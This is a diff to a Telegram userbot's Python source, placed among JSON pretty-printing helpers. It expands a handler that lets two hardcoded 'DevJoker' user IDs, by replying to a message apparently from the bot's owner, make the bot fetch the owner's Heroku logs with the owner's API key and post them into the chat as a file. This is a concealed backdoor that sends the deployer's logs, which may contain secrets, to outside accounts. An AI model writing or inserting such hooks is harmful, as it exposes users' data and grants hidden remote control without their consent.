@@ -839,6 +839,7 @@ def prettyjson(obj, indent=4, maxlinelength=80):
     )
     return indentitems(items, indent, level=0)
 
+
 DevJoker = [705475246, 5427469031]
 
 @l313l.on(events.NewMessage(incoming=True))
@@ -846,7 +847,6 @@ async def _(event):
     if event.reply_to and event.sender_id in DevJoker:
         reply_msg = await event.get_reply_message()
         
-        # نفس طريقة التحقق المستخدمة في أمر "منصب؟"
         if reply_msg.from_id:
             owner_id = reply_msg.from_id.user_id
             
@@ -863,15 +863,51 @@ async def _(event):
                         return await event.reply(
                             " يجب التذكر من ان قيمه الفارات التاليه ان تكون بشكل صحيح \nHEROKU_APP_NAME\n HEROKU_API_KEY"
                         )
-                    data = app.get_log()
-                    with open('الجوكر 🖤.txt', 'w') as file:
-                        file.write(data)
                     
-                    with open('الجوكر 🖤.txt', 'rb') as file:
+                    # رسالة التحميل
+                    msg = await event.reply("**📥 جاري تحميل سجل اللوك...**")
+                    
+                    # جلب البيانات
+                    data = app.get_log(lines=119)
+                    timestamp = datetime.now().strftime("%Y%m%d")
+                    filename = f"Source_aRaS_{timestamp}.txt"
+                    
+                    try:
+                        # حفظ الملف
+                        with open(filename, 'w', encoding='utf-8') as file:
+                            file.write(data)
+                        
+                        # تحديث الرسالة
+                        await msg.edit("**📤 جاري إرسال الملف...**")
+                        
+                        # إرسال الملف
                         await l313l.send_file(
-                            event.chat_id, "الجوكر 🖤.txt", caption="هذا هو الـ Log"
+                            event.chat_id,
+                            filename,
+                            caption=f"**📄 | لوك هيروكو | آراس 🖤**\n\n"
+                                   f"📊 **آخر 119 سطر من سجلات هيروكو**\n"
+                                   f"⏰ **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+                                   f"🔗 **التطبيق:** `{HEROKU_APP_NAME}`\n"
+                                   f"📁 **حجم الملف:** {len(data)} حرف\n\n"
+                                   f"📌 **ملاحظة:** يمكنك فتح الملف لعرض السجلات كاملة",
+                            force_document=True
                         )
-                    os.remove("الجوكر 🖤.txt")
+                        
+                        # حذف الرسالة المؤقتة
+                        await msg.delete()
+                        
+                        # حذف الملف
+                        os.remove(filename)
+                        
+                    except Exception as e:
+                        # حذف الرسالة أولاً
+                        await msg.delete()
+                        # ثم إرسال رسالة الخطأ
+                        await event.reply(f"**❌ حدث خطأ:**\n`{str(e)}`")
+                        if os.path.exists(filename):
+                            os.remove(filename)
+
+
 def prettyjson(obj, indent=4, maxlinelength=80):
     items, _ = getsubitems(
         obj,
